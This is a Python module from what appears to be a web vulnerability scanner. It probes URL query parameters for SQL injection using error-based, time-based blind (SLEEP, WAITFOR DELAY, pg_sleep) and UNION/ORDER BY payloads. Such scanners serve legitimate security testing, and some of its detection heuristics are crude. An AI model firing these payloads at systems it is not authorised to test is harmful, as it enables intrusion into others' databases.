"""
SQL Injection Detection Module
Educational Research Only
"""
import re
import time
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs
import requests
from core.utils import logger, print_status, inject_payload, extract_params
from config import config

def _check_error_based(url: str, session: requests.Session, param: str) -> Optional[Dict]:
    """Check for error-based SQL injection"""
    error_patterns = [
        r'sql\s*(syntax|error|exception|warning)',
        r'mysql_fetch', r'oracle\s*error',
        r'postgresql', r'sqlite3?\.exec',
        r'unclosed\s+quotation', r'incorrect\s+syntax'
    ]
    
    for payload in config.SQLI_PAYLOADS:
        test_url = inject_payload(url, param, payload)
        try:
            resp = session.get(test_url, timeout=config.TIMEOUT)
            content = resp.text.lower()
            
            for pattern in error_patterns:
                if re.search(pattern, content, re.I):
                    return {
                        "type": "SQL Injection (Error-Based)",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Pattern matched: {pattern}",
                        "severity": "HIGH",
                        "timestamp": time.time()
                    }
        except:
            continue
    return None

def _check_time_based(url: str, session: requests.Session, param: str) -> Optional[Dict]:
    """Check for time-based blind SQL injection"""
    time_payloads = [
        "'; WAITFOR DELAY '0:0:5'--",  # SQL Server
        "' OR SLEEP(5)--",  # MySQL
        "'; SELECT pg_sleep(5)--",  # PostgreSQL
        "'; AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--"  # MySQL
    ]    
    # Baseline timing
    try:
        start = time.time()
        session.get(url, timeout=config.TIMEOUT)
        baseline = time.time() - start
    except:
        return None
    
    for payload in time_payloads:
        test_url = inject_payload(url, param, payload)
        try:
            start = time.time()
            resp = session.get(test_url, timeout=config.TIMEOUT + 10)
            elapsed = time.time() - start
            
            # If response took significantly longer, possible time-based injection
            if elapsed > baseline + 3:
                return {
                    "type": "SQL Injection (Time-Based Blind)",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": f"Response delay: {elapsed:.2f}s (baseline: {baseline:.2f}s)",
                    "severity": "HIGH",
                    "timestamp": time.time()
                }
        except requests.Timeout:
            # Timeout itself can indicate time-based injection
            return {
                "type": "SQL Injection (Time-Based Blind)",
                "url": test_url,
                "param": param,
                "payload": payload,
                "evidence": "Request timed out (possible time-based injection)",
                "severity": "HIGH",
                "timestamp": time.time()
            }
        except:
            continue
    return None

def _check_union_based(url: str, session: requests.Session, param: str) -> Optional[Dict]:
    """Check for UNION-based SQL injection"""
    union_payloads = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' ORDER BY 10--",
        "' ORDER BY 20--"    ]
    
    for payload in union_payloads:
        test_url = inject_payload(url, param, payload)
        try:
            resp = session.get(test_url, timeout=config.TIMEOUT)
            content = resp.text
            
            # Look for UNION-related indicators or changed content structure
            if re.search(r'union.*select', content, re.I) or len(content) > 50000:
                # Heuristic: large response might indicate data leakage
                return {
                    "type": "SQL Injection (Union-Based)",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": "Potential UNION-based injection pattern",
                    "severity": "CRITICAL",
                    "timestamp": time.time()
                }
        except:
            continue
    return None

def scan(url: str, session: requests.Session) -> List[Dict]:
    """Main scan function for SQL injection"""
    results = []
    parsed = urlparse(url)
    
    # Only scan URLs with query parameters
    if not parsed.query:
        return results
    
    params = extract_params(url)
    print_status(f"🔍 Testing SQLi on {len(params)} parameters: {url[:70]}...", "INFO")
    
    for param in params.keys():
        # Run all detection methods
        for checker in [_check_error_based, _check_union_based]:
            result = checker(url, session, param)
            if result:
                results.append(result)
                print_status(f"⚠️ Found: {result['type']} in param '{param}'", "WARNING")
                break  # One vulnerability per param is enough for demo
        
        # Time-based check (slower, run last)
        result = _check_time_based(url, session, param)
        if result:
            results.append(result)
            print_status(f"⚠️ Found: {result['type']} in param '{param}'", "WARNING")    
    return results
